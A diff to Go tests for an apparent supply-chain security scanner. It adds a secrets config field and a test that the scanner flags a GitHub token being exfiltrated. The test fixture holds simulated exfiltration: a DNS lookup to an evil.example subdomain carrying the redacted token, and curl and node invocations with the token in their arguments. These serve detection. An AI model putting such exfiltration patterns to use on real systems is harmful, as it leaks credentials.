@@ -216,20 +216,41 @@ func TestScanReportsTakeTheConfig(t *testing.T) {
 	}
 
 	var out bytes.Buffer
-	if err := writeScanJSON(&out, "github.com/o/r@abc", nil, runs, findings, verdictPass, nil, []string{"severity: connect LOW"}); err != nil {
+	if err := writeScanJSON(&out, "github.com/o/r@abc", nil, runs, findings, verdictPass, nil, []string{"severity: connect LOW"}, []string{"GITHUB_TOKEN"}); err != nil {
 		t.Fatal(err)
 	}
 	var report struct {
 		Target string `json:"target"`
 		Config struct {
 			Overrides []string `json:"overrides"`
+			Secrets   []string `json:"secrets"`
 		} `json:"config"`
 	}
-	if err := json.Unmarshal(out.Bytes(), &report); err != nil || report.Target != "github.com/o/r@abc" || !slices.Equal(report.Config.Overrides, []string{"severity: connect LOW"}) {
+	if err := json.Unmarshal(out.Bytes(), &report); err != nil || report.Target != "github.com/o/r@abc" || !slices.Equal(report.Config.Overrides, []string{"severity: connect LOW"}) || !slices.Equal(report.Config.Secrets, []string{"GITHUB_TOKEN"}) {
 		t.Errorf("JSON %s: %v", out.String(), err)
 	}
 	out.Reset()
-	if err := writeScanJSON(&out, "x", nil, runs, findings, verdictPass, nil, nil); err != nil || strings.Contains(out.String(), `"config"`) {
+	if err := writeScanJSON(&out, "x", nil, runs, findings, verdictPass, nil, nil, nil); err != nil || strings.Contains(out.String(), `"config"`) {
 		t.Errorf("no overrides: %s, %v; want no config object", out.String(), err)
+	}
+}
+
+// TestAnalyzeRealSecrets: a config secret, redacted on the way in, out in
+// a lookup or on a network tool's command line is exfiltration.
+func TestAnalyzeRealSecrets(t *testing.T) {
+	t.Parallel()
+	run := entryRun{
+		dns:   []dnsName{{name: "[redacted:GITHUB_TOKEN].evil.example"}},
+		procs: []traceEvent{{kind: "proc", path: "/usr/bin/curl", argv: []string{"curl", "-H", "Authorization: [redacted:GITHUB_TOKEN]", "https://x"}}, {kind: "proc", path: "/usr/bin/node", argv: []string{"node", "[redacted:GITHUB_TOKEN]"}}},
+	}
+	got := analyze(run, "a1b2c3d4e5f6", nil)
+	for _, want := range []finding{
+		{sevCritical, "canary-exfiltration", "sends a secret from the config out in a DNS lookup: [redacted:GITHUB_TOKEN].evil.example"},
+		{sevCritical, "canary-exfiltration", "passes a secret from the config to curl"},
+		{sevHigh, "canary-argv", "puts a secret from the config on node's command line"},
+	} {
+		if !slices.Contains(got, want) {
+			t.Errorf("findings lack %+v:\n%+v", want, got)
+		}
 	}
 }
